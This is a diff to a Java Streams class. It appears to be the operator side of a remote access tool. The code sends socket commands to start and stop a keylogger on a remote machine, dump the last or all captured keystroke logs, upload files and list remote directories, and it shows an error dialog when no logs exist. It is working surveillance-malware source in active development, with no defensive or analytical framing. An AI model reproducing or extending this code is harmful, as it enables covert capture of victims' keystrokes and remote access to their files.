@@ -13,6 +13,7 @@ import Information.Action;
 import org.json.JSONObject;
 
 
+import javax.swing.*;
 import java.io.*;
 import java.net.Socket;
 import java.util.ArrayList;
@@ -153,10 +154,10 @@ public class Streams {
         return null;
     }
 
-    public void sendAction(Action action, List<String> destinations, int length) throws IOException {
+    public void sendAction(Action action, String destinationPath, int length) throws IOException {
         if (action == Action.UPLOAD) {
             sendSize(10);
-            sendList(destinations);
+            sendString(destinationPath);
             sendSize(length);
         }
     }
@@ -178,18 +179,10 @@ public class Streams {
     }
 
     public List<String> sendAndReadAction(Action action, String name) throws IOException {
-        switch (action) {
-            case R_A_DIR -> {
-                sendSize(3);
-                sendString(name);
-                return new ArrayList<>(Arrays.asList(readString().split("\\|")));
-            }
-            case R_FO_DIR -> {
-                sendSize(4);
-                sendString(name);
-                return readList();
-            }
-
+        if (action == Action.R_A_DIR) {
+            sendSize(3);
+            sendString(name);
+            return new ArrayList<>(Arrays.asList(readString().split("\\|")));
         }
         return null;
     }
@@ -252,20 +245,29 @@ public class Streams {
             case START -> sendSize(12);
             case STOP -> sendSize(13);
             case DUMP_LAST -> {
-                if (sendAndReadAction(KeyloggerEvents.CHECK_LAST)) {
-                    sendSize(1401);
+                sendSize(4);
+                if (readSize()!=-1) {
                     receiveFile(nameOfSession);
                     FolderOpener.open(nameOfSession);
+                } else {
+                    noLogsToDownload();
                 }
             }
             case DUMP_ALL -> {
-                if (sendAndReadAction(KeyloggerEvents.CHECK_ALL)) {
-                    sendSize(1402);
+                sendSize(14);
+                if (readSize()!=-1) {
                     receiveLogs(nameOfSession);
                     FolderOpener.open(nameOfSession);
+                } else {
+                    noLogsToDownload();
                 }
             }
         }
+    }
+
+    private void noLogsToDownload (){
+        SwingUtilities.invokeLater(() -> JOptionPane.showMessageDialog(null, "There are no logs to download!",
+                "Keylogger error", JOptionPane.ERROR_MESSAGE));
     }
 
     private void receiveLogs(String nameOfSession) throws IOException {
